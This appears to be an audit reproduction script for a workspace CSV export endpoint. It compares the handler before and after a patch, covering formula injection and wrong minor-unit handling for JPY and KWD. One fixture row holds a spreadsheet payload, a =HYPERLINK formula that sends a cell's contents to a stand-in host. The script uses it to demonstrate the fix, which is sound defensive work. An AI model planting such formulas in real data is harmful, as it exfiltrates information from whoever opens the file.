/**
 * AF6-20261120-01 — reproduction for `GET /api/v1/workspaces/:id/export?format=csv`.
 *
 * The handler in `src/server/routes/workspaceApiRoutes.ts` builds the CSV by hand. This script runs
 * the two halves of that handler that are wrong — the bytes it wrote before the fix (copied verbatim
 * from the handler) and the bytes the patch writes (`patches/01-…patch`) — over the same rows, so the
 * difference is a fact rather than a claim. It imports nothing: the point is to show that the
 * handler's own arithmetic, not a shared helper, produced these cells.
 *
 *   node audit/agent6-2026-11-20/repro/workspace-csv-export.mjs
 */
import { currencyDigits, minorToMajor } from '../../../src/lib/currencyMinorUnits.ts';
import { sanitizeCsvCell } from '../../../src/lib/csv.ts';

const transactions = [
  // A description one workspace member can type today (a viewer cannot write money, but a memo is text).
  { date: '2026-11-18', totalAmountCents: 1650000, description: ' =HYPERLINK("https://evil.test/collect?d="&A1,"Open invoice")', currency: 'USD', type: 'actual', status: 'posted', reference: 'INV-1001' },
  // ¥1,000,000 stored as 1000000 minor units (0 decimals): "/100 then toFixed(2)" says 10000.00.
  { date: '2026-11-18', totalAmountCents: 1000000, description: 'Tokyo office rent', currency: 'JPY', type: 'actual', status: 'posted', reference: 'INV-1002' },
  // KWD 12.345 (3 decimals): "/100 then toFixed(2)" says 123.45 — 10× too high.
  { date: '2026-11-18', totalAmountCents: 12345, description: 'Kuwait retainer', currency: 'KWD', type: 'actual', status: 'posted', reference: 'INV-1003' },
];

/** The handler as it stands on `main` at d1f2c8d (lines 146–165). */
function beforeFix(rows) {
  let csvContent = 'Date,Amount,Description,Category,Type,Status,Reference\n';
  const accountsMap = new Map([['a1', 'Consulting revenue']]);
  for (const t of rows) {
    const categoryName = accountsMap.get('a1');
    const amountStr = ((t.totalAmountCents || 0) / 100).toFixed(2);
    const row = [
      t.date || '',
      amountStr,
      `"${(t.description || '').replace(/"/g, '""')}"`,
      `"${String(categoryName).replace(/"/g, '""')}"`,
      t.type || 'actual',
      t.status || 'posted',
      `"${(t.reference || '').replace(/"/g, '""')}"`,
    ];
    csvContent += row.join(',') + '\n';
  }
  return csvContent;
}

/** The handler after `patches/01-workspace-csv-export-formula-and-currency.patch`. */
function afterFix(rows, bookCurrency = 'USD') {
  const accountsMap = new Map([['a1', 'Consulting revenue']]);
  const out = [['Date', 'Amount', 'Description', 'Category', 'Type', 'Status', 'Reference']];
  for (const t of rows) {
    const rowCurrency = /^[A-Z]{3}$/.test(String(t.currency || '').toUpperCase()) ? String(t.currency).toUpperCase() : bookCurrency;
    out.push([
      String(t.date || ''),
      minorToMajor(Number(t.totalAmountCents || 0), rowCurrency).toFixed(currencyDigits(rowCurrency)),
      String(t.description || ''),
      String(accountsMap.get('a1')),
      String(t.type || 'actual'),
      String(t.status || 'posted'),
      String(t.reference || ''),
    ]);
  }
  return out.map(row => row.map(cell => sanitizeCsvCell(cell)).join(',')).join('\r\n') + '\r\n';
}

const path = process.argv[2];
if (path === '--json') {
  process.stdout.write(JSON.stringify({ before: beforeFix(transactions), after: afterFix(transactions) }, null, 2));
} else {
  console.log('--- before the fix (what the endpoint writes today) ---');
  console.log(beforeFix(transactions));
  console.log('--- after patches/01 ---');
  console.log(afterFix(transactions));
}
